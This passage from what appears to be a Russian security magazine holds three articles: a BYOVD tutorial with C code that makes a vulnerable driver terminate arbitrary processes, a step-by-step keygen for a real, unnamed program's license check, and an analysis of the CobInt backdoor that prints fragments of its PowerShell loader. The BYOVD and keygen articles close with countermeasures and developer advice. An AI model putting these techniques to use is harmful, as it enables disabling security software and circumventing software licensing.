   Далее вызывается функция welcome. Параметром ей передается дескрип‐
тор сокета. Ее задача — вывод экрана приглашения для авторизации. А дес‐
криптор сокета служит для указания, куда вывести данные (ведь это может
быть удаленный комп). Еще ниже следует функция authenticate, ей тоже
передается параметр — значение переменной fildes.
  С функции authenticate начинается механизм аутентификации. Это сле‐
дует из того, что сразу после ее вызова идет условный оператор test,
который проверяет возвращенное значение: если оно равно нулю, выпол‐
няется переход в место вызова функции reject, которая выводит инфу о неп‐
равильно  введенном  имени  пользователя и не  тех  дроидах. Возьмем
на заметку: при корректных пользовательских данных функция authenticate
возвращает отличное от нуля значение. Перейдем наконец в ее тело:


s sym.authenticate
pdf





                  Дизассемблированная функция authenticate

Кроме  аргумента (дескриптора сокета), в функции есть пять локальных
переменных. Их типы данных отражены в комментариях, заботливо оставлен‐
ных R2. Аргумент из регистра аккуратно кладется в переменную fd. Промота‐
ем функцию вниз. В ее начале ничего интересного нет, но спустя несколько
строчек наш взгляд привлекает вызов функции с говорящим названием
check_username, которой в качестве единственного аргумента передается
значение переменной fd.


ПРОМЕЖУТОЧНЫЕ ИТОГИ

Итак, мы рассмотрели все утилиты фреймворка Radare2, установили в Debian
все нужные для предстоящих экспериментов пакеты. На примере подготов‐
ленной мной крякми мы начали изучать статический анализ и освоили нес‐
колько основных приемов.
   Впереди  нас  ждет  много  интересного. Нам  предстоит  научиться
с помощью Radare2 находить данные для логина, модифицировать сервер
так, чтобы он работал, как нам надо, и, наконец, мы научимся извлекать дан‐
ные и превращать их в файлы с полезной нагрузкой. Кроме того, используя
Radare2, мы проведем динамический анализ. И все это — в консольном
режиме!
ВЗЛОМ





Многие именитые хакерские группировки,
например    северокорейская    Lazarus,
используют  доступ  к  пространству ядра
через атаку BYOVD при выполнении слож‐
ных APT-нападений. Тот же метод исполь‐             Nik Zerof                                                                                              xtahi0nix@gmail.com
зуют авторы инструмента Terminator, а также
операторы  различных  шифровальщиков.
В этой  статье мы подробно  разберем,
как работает BYOVD и почему эта атака ста‐
ла популярной.


        WWW

                          •Хак‑группа Lazarus эксплуатирует драйвер Dell
                         для развертывания руткита (Хакер)
                         •«Убийца  антивирусов» с  хакерских форумов
                                оказался вариацией BYOVD-атаки (Хакер)
                          •Вымогатели  научились  деактивировать EDR-
                       решения через уязвимый драйвер сторонней
                          Windows-утилиты Process Explorer (SecurityLab)


На самом деле в узких кругах давно было известно о возможности исполь‐
зовать чужой драйвер в своих целях, но до какого‑то момента она не была
столь важной. Можно было открыть любой хакерский форум и найти пучок
других способов обойти проверку целостности ядра Windows и надурить
механизм KPP (Kernel Patch Protection).
  Но в Microsoft тоже об этом догадывались и в итоге довели контроль
целостности ядра до достаточно высокого уровня, обломав всю малину
любителям нестандартного программирования. Вот тогда все вспомнили
про BYOVD, потому что реализовать эту атаку значительно проще, чем искать
зиродеи в механизме контроля целостности ядра.
  BYOVD дает хорошие возможности: позволяет отключать антивирусы, под‐
нимать привилегии (LPE) и делать другие интересные фокусы, в зависимости
от того, какой драйвер атакован.
  В конце концов, ядро всегда было лакомым кусочком для хакеров всех
мастей. Давай разберемся, как работает эта атака.


КАК УСТРОЕН ДРАЙВЕР

Для начала нам нужно понимать, что такое драйвер в Windows и как он устро‐
ен. Очевидно, что, как и у любого другого приложения, у драйвера есть точка
входа, которая называется DriverEntry и имеет следующий прототип:


NTSTATUS DriverEntry (
  _In_ PDRIVER_OBJECT DriverObject,
  _In_ PUNICODE_STRING RegistryPath
);

Видим, что в основную функцию драйвера передаются два  аргумента:
DriverObject, представляющий собой указатель на структуру DRIVER_OBJECT,
которая  содержит  информацию  о  драйвере,  и  указатель  на  строку
RegistryPath с путем к файлу драйвера. Сама структура DRIVER_OBJECT выг‐
лядит так:


typedef struct _DRIVER_OBJECT {
  CSHORT             Type;
  CSHORT             Size;
  PDEVICE_OBJECT     DeviceObject;
  ULONG              Flags;
  PVOID              DriverStart;
  ULONG              DriverSize;
  PVOID              DriverSection;
  PDRIVER_EXTENSION  DriverExtension;
  UNICODE_STRING     DriverName;
  PUNICODE_STRING    HardwareDatabase;
  PFAST_IO_DISPATCH  FastIoDispatch;
  PDRIVER_INITIALIZE DriverInit;
  PDRIVER_STARTIO    DriverStartIo;
  PDRIVER_UNLOAD     DriverUnload;
  PDRIVER_DISPATCH   MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];
} DRIVER_OBJECT, *PDRIVER_OBJECT;


Чтобы приложение из пользовательского режима могло взаимодействовать
с драйвером, работающим в режиме ядра, создается устройство драйвера
при помощи функции IoCreateDevice или WdmlibIoCreateDeviceSecure и сим-
волическая ссылка на него при помощи IoCreateSymbolicLink.
   Вот фрагмент кода в реальном драйвере, где происходит создание сим‐
волической ссылки на него.





     Создание символической ссылки при помощи IoCreateSymbolicLink

Теперь разберемся с тем, как приложение пользовательского режима зас‐
тавляет драйвер выполнить какое‑либо действие.
   Обрати   внимание  на  поле  PDRIVER_DISPATCH   MajorFunction[
IRP_MJ_MAXIMUM_FUNCTION + 1] в структуре DRIVER_OBJECT. Это поле —
массив указателей на функции, которые будет выполнять драйвер в опре‐
деленных условиях (то есть, по сути, список выполняемых драйвером дей‐
ствий).
   Прежде  всего нас  интересует IRP_MJ_DEVICE_CONTROL — это один
из кодов функций IRP (I/O Request Packet) в массиве MajorFunction. Он
используется для обработки запросов на управление устройством драйвера,
таких как чтение и запись данных. Чтобы было нагляднее, пример кода драй‐
вера, отвечающий за инициализацию разных функций IRP:


NTSTATUS DispatchRead(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);


    // Обработка операции чтения файла
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;


    IoCompleteRequest(Irp, IO_NO_INCREMENT);


    return STATUS_SUCCESS;
}


...


NTSTATUS DriverEntry:


    // Заполнение массива MajorFunction
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    // Код, выполняющийся при событии IRP_MJ_READ
    DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] =
DriverDispatch;


             INFO

                          Input/Output Control, или IOCTL, — это механизм
                           взаимодействия  между  пользовательским  при‐
                        ложением и драйвером устройства в Windows.
                      IOCTL    позволяет   приложению    отправлять
                       управляющие команды и запросы к драйверам
                           устройств для выполнения различных операций,
                         таких как чтение или запись данных, установка
                         параметров устройства, получение информации
                      о состоянии устройства и многое другое. Когда
                          приложение  отправляет  IOCTL,  операционная
                          система  передает  запрос  соответствующему
                         драйверу устройства, который затем выполняет
                          нужное действие и возвращает результат опе‐
                        рации.


IOCTL-запросы обрабатываются в специальной функции DriverDispatch, вот
ее прототип (запомни его, он нам понадобится, чтобы найти эту функцию
в дизассемблере):


NTSTATUS DriverDispatch(
  [in, out] _DEVICE_OBJECT *DeviceObject,
  [in, out] _IRP *Irp
)

Код  обработки IOCTL-запросов  к  драйверу,  реализованной в  функции
DriverDispatch, может выглядеть примерно так:


NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
    ULONG controlCode = irpStack->Parameters.DeviceIoControl.
IoControlCode;


    switch(controlCode)
    {
        case IOCTL_CUSTOM_COMMAND:
            // Обработка пользовательской команды
            status = ProcessCustomCommand(DeviceObject, Irp);
            break;


        case IOCTL_ANOTHER_COMMAND:
            // Обработка другой пользовательской команды
            status = ProcessAnotherCommand(DeviceObject, Irp);
            break;


        default:
            // Неизвестная команда, возвращаем ошибку
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }


    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);


    return status;
}

В  этой  функции  IOCTL_CUSTOM_COMMAND  и  IOCTL_ANOTHER_COMMAND —
это просто дефайны, содержащие номера IOCTL. Их будет отправлять поль‐
зовательское приложение в драйвер. По запросу приложений функции будут
выполняться уже в драйвере и с приоритетом ring 0. Часть switch-case в фун‐
кции DispatchDeviceControl — одна из самых интересных для нас, потому
что как раз содержит номера управляющих IOCTL-запросов.


ИССЛЕДУЕМ ДРАЙВЕР

После того как мы ознакомились с базовой структурой драйвера, поняли,
как драйвер взаимодействует с юзермодом, настало время реверса! Заг‐
ружаем подопытный драйвер в IDA Pro и видим точку входа драйвера.
   Так как это реальный драйвер, уязвимый для BYOVD, его начальный код
может несколько отличаться от простейшего макета драйвера. Чтобы попасть
в области кода, содержащие создание устройства, символической ссылки
и начало инициализации массива MajorFunction, проследим, куда ведет
аргумент DriverObject, ведь он обязателен для действий инициализации.
В итоге находим это место, оно рядом с кодом создания символической
ссылки. Но так бывает не всегда.





                          Заполнение MajorFunction

Строчка с memset инициализирует массив MajorFunction. Идем в функцию
sub_140014890, указанную в аргументе, видим много кода.





                      Поиск функции диспетчеризации

Отыскиваем функцию диспетчеризации по ее прототипу (помнишь, я говорил,
что его надо запомнить?) — просто прослеживаем, куда идет аргумент,
содержащий IRP. А уже внутри функции видим код инициализации разных эле‐
ментов MajorFunction.





                 Инициализируются элементы MajorFunction

Нам интересен именно IRP_MJ_DEVICE_CONTROL, поэтому смотрим в фун‐
кцию sub_140018ff8 и находим в ней различные case, которые и реализуют
управляющие коды IOCTL.





                       Наблюдаем различные IOCTL

Теперь дело техники: нужно посмотреть, что делает каждый case, чтобы найти
что‑то интересное и полезное для нас. Немножко осмотревшись в коде,
находим функцию, которая умеет завершать процессы по переданному PID.





     ZwOpenProcess и ZwTerminateProcess не могут не заинтересовать

Как видно из кода, функция завершает процесс, используя обращение
к ZwTerminateProcess. То, что нужно! Запоминаем номер IOCTL-запроса,
который вызывает эту функцию.


ПИШЕМ КОД

Итак, реверс драйвера принес свои плоды, теперь нам нужно написать инс‐
трумент, который поможет проэксплуатировать драйвер и заставить его
завершить любой процесс по нашей команде. Но сначала нам нужно обра‐
титься к драйверу. Из юзермода это можно сделать при помощи функции
DeviceIoControl, вот ее прототип:


BOOL DeviceIoControl(
  [in]                HANDLE       hDevice,
  [in]                DWORD        dwIoControlCode,
  [in, optional]      LPVOID       lpInBuffer,
  [in]                DWORD        nInBufferSize,
  [out, optional]     LPVOID       lpOutBuffer,
  [in]                DWORD        nOutBufferSize,
  [out, optional]     LPDWORD      lpBytesReturned,
  [in, out, optional] LPOVERLAPPED lpOverlapped
);

Обрати внимание на параметр hDevice — его мы извлекаем из нашего
дизасма, в момент, когда формируется символическая ссылка. А параметр
dwIoControlCode —  это номер  ветки  case,  которая  содержит вызов
ZwTerminateProcess.


int main() {


    int status = 0, proc_id = 0;
    DWORD retBytes = 0;


    scanf("%u", &proc_id);


    HANDLE hDevice = CreateFileA(
        "\\\\.\\my_driver",
        GENERIC_WRITE|GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
        );


    status = DeviceIoControl(hDevice, 0x88889988, &proc_id, sizeof(
proc_id), NULL, 0, &retBytes, NULL);


        CloseHandle(hDevice);


    return 0;
}

Код предельно прост: при помощи CreateFileA мы получаем дескриптор
устройства драйвера по его ссылке, которую мы обнаружили в процессе
реверса, а вызов функции DeviceIoControl дает прямое указание драйверу
выполнить  то  действие,  которое  указывается  IOCTL-кодом  (аргумент
dwIoControlCode). В нашем случае это завершение процесса по его ID. Пос‐
ле  выполнения  этого  кода  драйвер  при  помощи  вызова  функции
ZwTerminateProcess завершит процесс прямо из ядра!


МОЖНО ЛИ ЗАЩИТИТЬСЯ?

Разумеется, эта техника — не «серебряная пуля», потому что были раз‐
работаны контрмеры, которые помогают минимизировать риски, связанные
с BYOVD:
 • отзыв сертификата подписи драйвера;
 • черный список драйверов;
 • Virtualization-based  Security (VBS) и Hypervisor-Protected Code  Integrity
   (HVCI).

Давай пройдемся по каждому. Черный список собирает контрольные суммы
и отпечатки драйверов, которые были замечены в атаках. Отзыв сертификата
обнуляет действие сертификата подписи, и драйвер становится как будто
неподписанным. А изоляция ядра на основе виртуализации (VBS и ее ком‐
понент  HVCI)  препятствует  вредоносным  действиям еще  неизвестных,
но использующихся для атак драйверов. Система виртуализации выступает
корнем доверия и предполагает, что ядро может быть в любой момент ском‐
прометировано.
  Все эти меры работают вместе и  стали эффективными  средствами
для предотвращения атак BYOVD. Но сработают они, только если поль‐
зователь их не отключил специально, например для улучшения произво‐
дительности.


ВЫВОДЫ

Надеюсь, мне удалось немного  рассказать о тех методах и средствах,
которыми пользуются одни из самых крутых хакерских группировок, а кто пре‐
дупрежден, тот, как известно, вооружен. Как минимум ты уже знаешь, почему
не стоит выключать защиту ядра Windows ради лишних 10% скорости!
ВЗЛОМ





Многие  программы  используют   ключи
для активации лицензии. Взломщики час‐
тенько пользуются этим и пишут кейгены,
способные выдать сколько угодно ключей,
которые софтина беспечно примет за нас‐           МВК
тоящие. В этой статье я покажу на примере,
как именно крякеры подбирают серийники
и создают кейгены.


Для демонстрации я возьму реальную программу с не самой простой
защитой, но по понятным причинам не буду называть ни ее, ни ее разработ‐
чика. Наша цель здесь лишь демонстрация уязвимости. Материал будет
полезен  разработчикам  софта, желающим  изучить технологию подбора
лицензионных ключей и понять, как это делают злые крякеры. Надеюсь,
это поможет в создании более совершенных защит.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена  для  исследователей  безопасности
                      и специалистов по разработке защиты програм‐
                           много обеспечения. Автор и редакция не несут
                           ответственности за любой вред,  причиненный
                        с   применением   изложенной   информации.
                       Нарушение авторских прав и патентного законо‐
                           дательства,   распространение   контрафактного
                  ПО и нарушение работы систем преследуются
                      по закону.


Итак, условие задачи: предположим, есть некий набор простых консольных
утилит. В триальном режиме каждая программа из этого набора работает
с мелкими, но неприятными ограничениями, однако у нее присутствует ключ
командной строки для ввода кода активации.
  При использовании ключа есть два варианта: если код активации неверен,
программа выдает строку «Error: Invalid License Key» и завершает работу,
в  противном  случае  отрабатывает  без  ограничений. Для  наглядности
упростим задачу: предположим, что программа ничем не защищена и не
обфусцирована, написана на C (проверить это можно в Detect It Easy).
  В принципе, триальные ограничения и проверка ключа в подобном случае
патчатся одним байтом, но такой вариант мы рассматривать не будем. Наша
задача — реверсировать проверку ключа активации, формат которого нам
неизвестен, и выяснить слабые места алгоритма. На этом примере я покажу,
каким образом в подобных случаях действуют авторы кейгенов.


ПОДБОР КЛЮЧА

Предположим, что процедура проверки регистрационного ключа уже най‐
дена. А вот выглядит она в нашем примере, на первый взгляд, весьма пуга‐
юще — даже в преобразованном в псевдокод виде.





                Процедура проверки регистрационного ключа

Подбирать ключ будем пошагово. Начнем с того, что подставим в качестве
регистрационного ключа произвольную строку (например, 00000000) и будем
трассировать отладчиком ее разбор до места, которое алгоритм сочтет неп‐
равильным. Затем исправляем строку соответствующим образом, чтобы про‐
верка проходила, снова подставляем исправленную строку, ищем следующую
несрабатывающую проверку и повторяем этот процесс до полного удов‐
летворения.
   Это выглядит как великолепный план, верно? Однако на практике все ока‐
зывается не так просто. Дойдя до конца бесконечного (sic!) цикла while(1)
с предыдущего скрина, алгоритм вываливается по условию в строке 741.





              Алгоритм вываливается по условию в строке 741

При этом логический смысл псевдопеременных v152 и v148 нам неясен. Вер‐
немся к самому первому скриншоту — на нем псевдопеременная v152 при‐
сутствует, видно условие ее инкремента и даже Switch, в котором она учас‐
твует в качестве аргумента.
   Нетрудно догадаться, что условием инкремента v152 является равенство
текущего символа строки регистрационного кода 58. А это значит, что символ
с кодом 58=0x3A=":" — это символ — разделитель групп, которых по выходу
из цикла должно насчитываться ровно семь.
   Таким образом, мы определили общий формат регистрационного ключа.
Он имеет следующий вид:


0000:1111:2222:3333:4444:5555:6666

Подставляем его в командную строку вместо прежнего и снова запускаем
проверку.
   Как и ожидалось, проверка в строке 741 (на предыдущем скрине) теперь
срабатывает правильно. Следующая критическая проверка обнаруживается
буквально несколькими строками ниже.





                        Следующая проверка

Тут все  предельно  просто:  группа 1111  последовательно  проверяется
на четыре шаблонных значениях ENTCPU, WEBCPU, OEM и ENTERP. Даже и не
будем заморачиваться тем, что это значит, просто подставляем первое
попавшееся значение ENTCPU в первую группу и выходим к следующей про‐
верке.





                 Очередная проверка лицензионного ключа

Здесь нас ждет какая‑то головоломка (запоздало предупреждаю, что с каж‐
дой группой сложность разгадки «головоломки» будет нарастать). Попробуем
ее разгадать. При более пристальном взгляде на этот код мы понимаем, что
это всего‑навсего проверка группы 4444 на содержание в ней следующих
символов:
 • (условная строка 927) 76=0x4C="L";
 • (условная строка 933) 76+1=0x4D="M";
 • (условная строка 941) 76+1+10=0x57="W".

Наличие любых других символов в этой группе расценивается как ошибка.
Итак, наш регистрационный код уже конкретизировался до следующего вида:
   0000:ENTCPU:2222:3333:LMW:5555:6666
  Я не зря предупреждал, что хоть до конца и осталось всего две нераз‐
гаданные группы символов, но с каждой группой сложность квеста будет рас‐
ти. Разгадывание содержимого группы 5555 поначалу выглядит совсем прос‐
то.





                  Разгадывание содержимого группы 5555

С первого взгляда видно, что длина группы составляет 13 символов, а первые
четыре символа — это 65=0x41="A", 77=0x4D="M", 83=0x53="S", 40=0x28="(
", итого "AMS(". А вот дальше начинается полный треш.





                  Продолжаем разгадывать головоломку

Создается впечатление, что странные хеши из кодов следующих восьми сим‐
волов представляют собой систему из трех уравнений (точнее, неравенств!),
несоблюдение которой делает ключ невалидным. Попробуем разобраться,
зачем авторы программы нагородили такой огород. Для начала выпишем
систему неравенств в более понятном виде. Пусть c[i] — i-й символ группы
5555, тогда система неравенств выглядит так:


( 10 * ( c[4] * 10 + c[5]) + c[6]) * 10 + c[7] – 53328 – 2007 <= 993
2 * ( 5 * c[8] – 264) + c[9] <= 12
c[10] * 10 + c[11] – 528 <= 31

Стало не сильно понятнее, хотя константы 2007, 12 и 31 о чем‑то смутно нам
напоминают — уж не о дате ли? Ну, например, месяц не может быть боль‐
ше 12, день месяца — больше 31, а год не должен превышать 2007 + 993 =
3000.
   Умножение на степени числа 10 намекает на десятичные цифры, но ведь
у нас в коде не цифры, а ASCII-коды символов? Присмотримся повниматель‐
нее к последнему неравенству, точнее, к волшебному числу 528 в нем. А ведь
это 480 + 48, то есть 0x30 * 10 + 0x30. Как хорошо не прогуливать математику
в школе, в этом случае левая часть последнего неравенства легко и неп‐
ринужденно преобразуется так:


c[10] * 10 + c[11] – 528 = c[10] * 10 + c[11] – 0x30 * 10 – 0x30 = 10
* (c[10] – 0x30) + (c[11] – 0x30)

Это неравенство будет истинным в том случае, если десятичное число
из строки, составленной из символов c[10] + c[11], будет <= 31. Аналогич‐
ные выкладки можно произвести и относительно первых двух неравенств,
из чего напрашивается вывод (тут же можно проверить его на практике), что
в скобках после AMS группа содержит дату вида AMS(20240704).
   Как ты уже догадался, самый сложный квест приготовлен на закуску —
речь идет о валидации условной группы 6666. Пока что на скриншоте мы
видим, что длина этой группы обязательно должна быть четным числом, затем
проверяется, что это число не менее 5, то есть минимальным допустимым
значением будет 6. Посмотрим на то, что с этой группой происходит в даль‐
нейшем.





                           Валидация группы 6666

При  беглом  взгляде  на  используемые  здесь  проверки  и  константы
(48=0x30="0"; 65=0x41="A"; 97=0x61="a") легко догадаться, что каждый
символ представляет собой цифру в Hex. Затем из них в условной стро‐
ке  1135  побайтово  собирается  бинарный  массив,  правда,  внезапно
в обратном порядке. Можно сказать, что и этот квест мы прошли без особого
труда, однако следующий код повергает нас в легкую панику.





                       Очень странный код

Тут явно замешана криптография, причем неизвестно какой сложности. Слег‐
ка прогулявшись по вызовам внутри sub_E1D9B0, мы натыкаемся на такой
код.





Этот код снова нам смутно что‑то напоминает. Ну конечно, это классическая
начальная инициализация таблицы перестановок алгоритмом ключевого рас‐
писания (key-scheduling algorithm):


private void init(byte[] key)
{
  int keyLength = key.Length;
  for (int i = 0; i < 256; i++)
  {
    S[i] = (byte)i;
  }
  int j = 0;
  for (int i = 0; i < 256; i++)
  {
    j = (j + S[i] + key[i % keyLength]) % 256;
    S.Swap(i, j);
  }
}

Ключ шифрования нам тоже известен, на предыдущем скрине он содержится
в переменной v149. Он и его длина v108 участвуют в инициализации вектора
перестановки RC4 процедурой sub_E1D9B0.
   Теперь, когда и этот квест пройден, возникает резонный вопрос: а какие
данные требуется шифровать? Уровень сложности все повышается, с этого
момента мы не можем просто так взять и править активационный ключ
руками, например в блокноте, как мы делали это раньше. Теперь для каждого
изменения нам придется перешифровывать бинарные данные, после чего
переводить их в текстовую строку, причем в реверсированном виде.
   Без кодинга на текущем этапе не обойтись: многие предпочли бы Python,
но я предлагаю реализовать программу на C#. Библиотеку RC4 можем ска‐
чать готовую.
   Как  ты, возможно,  догадался, в финале нам  предстоит  преодолеть
еще более крутую высоту. Двигаясь дальше в поисках парсинга дешифрован‐
ного блока, мы натыкаемся вот на такую засаду.





Хитрые создатели библиотеки решили перед шифрованием упаковать дан‐
ные любимым алгоритмом сжатия PDF-стримов — FlateDecode. Это весьма
досадно: известно, что алгоритм Deflate отличается от обычно используемых
дотнетовских стандартных библиотек System.IO.Compression и zlib. Самый
подходящий пакет для данного случая, на мой взгляд, Ionic.Zlib. Устанавлива‐
ем его через NuGet и подключаем к проекту. Кодирование блока 6666
из исходного бинарного массива raw на языке C# теперь выглядит примерно
так:


...
 byte [] ionicCompressed = Ionic.Zlib.ZlibStream.CompressBuffer(raw);
 byte[] crypted = RC4.Apply(ionicCompressed, RC4key);
 string result = ByteArrayToString(crypted);
...

Похоже, мы наконец проделали наиболее сложный этап работы — разоб‐
рались с самыми каверзными алгоритмами шифрования и компрессии
и даже создали собственный инструмент для моделирования регистрацион‐
ного ключа. Осталось дело техники: реверсировать парсинг расшифрованных
и распакованных данных. Чтобы не утомлять тебя и так уже затянувшимся
повествованием, приведу только ключевые фрагменты кода.





                       Ключевые фрагменты кода

Здесь и ниже функция sub_48CA30 распаковывает текущий символ и возвра‐
щает его. В случае ошибки возвращается -1. Функция sub_49DAF0 добавляет
этот символ в буфер декомпрессии. Итак, представленный код распаковы‐
вает все символы из упакованного входного потока до символа с кодом 0
и помещает их в буфер v191.





Здесь sub_49DC10 — это не что иное, как sscanf, преобразующий строковое
значение группы 2222 из псевдопеременной v116 (она, как видишь, может
состоять только из десятичных цифр) в числовое значение v115. Затем оно
проверяется на равенство с последним ненулевым байтом из буфера деком‐
прессии. Если значения совпадают, то все нормально, можно продолжать
парсинг дальше.





        Если значения совпадают, можно продолжать парсинг дальше

Первые четыре символа буфера декомпрессии проверяются на равенство
с символами группы 0000 — должно быть полное совпадение, чтобы пройти
финальную проверку.





  Четыре символа буфера декомпрессии проверяются на равенство
  с символами группы 0000

Данные в буфере декомпрессии закончились, побайтово распаковываем наш
массив  дальше.  Следующий  распакованный  байт  должен  совпадать
с текущим счетчиком декомпрессированных данных из псевдопеременной
v126. Если это условие выполняется, то следующие распакованные два бай‐
та — это год окончания лицензии, который мы получили при парсинге группы
5555, а следующие два байта — это месяц и день оттуда же. Условие в стро‐
ке 1296 проверяет текущую дату на предмет окончания лицензии, если время
еще есть — лицензия валидна, можно работать дальше.
   Итак, мы реверсировали исходный вид массива валидных данных из груп‐
пы 6666, который теперь можно упаковать нашей самописной программой.
В полученном регистрационном коде:
 • 0000 — первые четыре байта совпадают с текстовым содержимым 0000;
 • 2 — значение этого байта должно совпадать с десятичным эквивалентом
   поля 2222;
 • 0 — обязательный байт‑разделитель;
 • 6 — значение этого байта совпадает с его позицией в распакованном
   буфере;
 • 0x7EE — два байта, год окончания лицензии (допустим, 2030);
 • 1 — один байт, месяц окончания лицензии (допустим, январь);
 • 1 — один байт, 1 января, с новым годом и окончанием лицензии!

Как видишь, последняя группа (условно названная нами 6666) — самая слож‐
ная для разбора, поскольку она содержит в себе проверочные значения всех
основных параметров лицензии. Наличие такого контрольного значения обя‐
зательно  для  составления  всех  нормальных  регистрационных  ключей.
Не будь его, любой эникейщик мог бы легко поправить руками нужный
параметр лицензии в  текстовом редакторе и регистрация потеряла бы
смысл.
  Не спорю, в разобранном примере алгоритм генерации контрольной
группы был выбран, мягко говоря, оригинально (собственно, из‑за этого
такой  пример  я  и решил  разобрать).  Обычно  программисты  сильно
не  заморачиваются  и  используют  в  качестве  контрольного  значения
какой‑либо криптографический хеш от содержимого лицензии, а то и просто
контрольную сумму разной степени сложности, в зависимости от лени и уров‐
ня личной паранойи.


РЕКОМЕНДАЦИИ ПРОГРАММИСТАМ

Теперь, когда мы разобрали пример изготовления чужого регистрационного
кода, дам несколько советов по совершенствованию своего. Как я уже
говорил, мы рассматривали самый простой случай — в частности, этот регис‐
трационный ключ привязан исключительно к триальной дате, то есть будет
работать на любом компьютере, хозяин которого каким‑то образом получит
такой ключ. А это небезопасно: ключ обычно привязывается к данным кон‐
кретного компьютерного оборудования (серийный номер жесткого диска
и процессора, MAC-адрес и так далее).
   Собственно, даже разобранный нами выше регистрационный ключ под‐
держивает привязку к конкретному компьютеру, но мы для упрощения раз‐
бора просто игнорировали значения некоторых групп, выбрав вариант ключа,
привязанного исключительно к дате.
  В заключение хочу высказать пару соображений по поводу формата клю‐
ча. Открытость данных внутри разобранного выше примера обоюдоостра —
с одной стороны, хорошо видно, для чего именно этот ключ используется
и какие у него ограничения. Но если подумать, то зачем искушать этой
информацией простого пользователя? Магия волшебной непонятной ком‐
бинации букв и цифр психологически работает гораздо сильнее, тем более
все гиганты софтверной индустрии поступают именно так. Почему бы тебе
тоже не следовать их примеру для дополнительной солидности?
  И еще один аспект касается кодирования информации внутри ключа.
Хорошим профессиональным тоном при изготовлении регистрационных клю‐
чей считается использование криптографии. Даже в таком простом примере,
который мы разобрали выше, при генерации контрольного блока использует‐
ся шифрование RC4 и компрессия FlateDecode. Однако мы легко иден‐
тифицировали эти алгоритмы и смоделировали кейген в своей собственной
программе, нам даже не пришлось ничего кодить руками — мы просто легким
движением мыши нагуглили распространенные стандартные библиотеки,
реализующие эти алгоритмы, и подключили их к своему проекту.
  А представь себе, если бы там оказалось нечто кастомное‑самописное?
Возможно, в ущерб криптостойкости, но трудоемкость реверса и модели‐
рования такого кодирования возросла бы в разы. Каждую строку алгоритма
пришлось бы зубами выгрызать из декомпилированного кода, да еще и изоб‐
ретать способ провернуть этот фарш назад. Можно даже, не выдумывая
собственный алгоритм, просто поменять стандартные константы или, к при‐
меру, разрядность вектора перестановок того же RC4, чтобы потенциальный
реверсер сломал себе мозги во время идентификации и моделирования
криптоалгоритма.
  И наконец, ничто не мешает нам пользоваться несимметричной крип‐
тографией. К примеру, если RC4 заменить ECDSA или RSA, то без секретного
ключа, даже при полном реверсе, вся идея генерации ключа на стороне
была бы обречена на провал изначально.
ВЗЛОМ





CobInt —  это  бэкдор, который  активно
использует  группировка  Cobalt/(Ex)Cobalt
при   атаках  на  российские  компании.
В статье мы по шагам выполним реверс
CobInt и изучим полезные техники анализа                   j0rtxf                                                                                   CSIRT (PT ESC), Positive
этой малвари.                                                                         Technologies                                                                                 ko1mbo656@gmail.com


        WWW

                          Подробности  про   группировку,   инструменты
                      и TTP ищи по ссылкам:
                          •Cobalt: обновление тактик и инструментов
                     •Уже не те: атаки (Ex)Cobalt на российские ком‐
                        пании в 2023 году



POWERSHELL LOADER

В начале 2024 года наша команда по расследованию инцидентов (PT ESC
Positive Technologies) выявила применение малвари CobInt в инфраструктуре
заказчика. Проанализировав логи EVTX на скомпрометированной машине,
мы извлекли сильно обфусцированный вредоносный скрипт PowerShell.





                     Обфусцированный код PowerShell

В конце кода скрипта мы видим вызов единственной функции, которая нас
больше всего и интересует.





                              Вызов функции

Код функции выглядит следующим образом:


If ([IntPtr]::size -eq 8)
{
    $L7Q=aQGIf
    $d90qSK=1331
}
else
{
    $L7Q=tNKdTPG
    $d90qSK=1166
}
$YodSQB=[System.Convert]::FromBase64String((vXQvbyjhW $L7Q))


RgEGGBTGL $YodSQB $d90qSK
}

В этой функции на основе размера указателя определяется разрядность ОС,
в зависимости от которой переменной $d90qSK присваивается соответству‐
ющее  значение. Оно  определяет  смещение  к  функции  расшифровки
шелл‑кода.  Шелл‑код  для  определенной   архитектуры   декодируется
из Base64, после чего передается в функцию RgEGGBTGL вместе со смещени‐
ем. Чтобы сохранить раскодированный шелл‑код на диск, сразу после вызова
функции FromBase64String добавим в код следующую строку:


[IO.File]::WriteAllBytes('shellcode.bin',$YodSQB)

Теперь убедимся, что шелл‑код сохранился корректно. Закидываем его в IDA,
переходим по смещению 1331 (0x533) в случае с x64 и преобразуем байты
в код.





                Код расшифровки по смещению 0x533


РАСШИФРОВКА ТЕЛА ШЕЛЛ-КОДА

Код, который отвечает за расшифровку самого себя в памяти, выглядит сле‐
дующим образом.





                Код для дешифровки тела шелл‑кода

Нам нужно преобразовать шелл‑код в исполняемый файл. Я это делаю
с помощью shellcode2exe:


shellcode2exe.bat 64 shellcode.bin cob_shellx64.exe

Теперь мы можем загрузить получившийся исполняемый файл в x64dbg. Пос‐
ле загрузки жмем RUN, чтобы перейти к EntryPoint.





        Интерпретация зашифрованных байтов шелл‑кода дебаггером

Код на текущий момент еще не расшифрован и представляет собой вольную
интерпретацию мешанины из байтов, выданной дебаггером. Нужно перейти
по известному смещению 0x533 + ImageBase, то есть в нашем случае
по адресу 0x401533.





                       Точка входа для расшифровки кода

Мы видим уже знакомую функцию для расшифровки тела шелл‑кода. Выпол‐
нять код мы начнем с текущей строки. Для этого жмем Set RIP Here, после
чего адрес Instruction Pointer примет необходимое значение.
  С помощью F8 нужно пройтись по инструкциям расшифровки и найти ту,
которая отвечает за выход из цикла. Эта инструкция находится по адресу
0x401538.





                Инструкция для выхода из цикла расшифровки

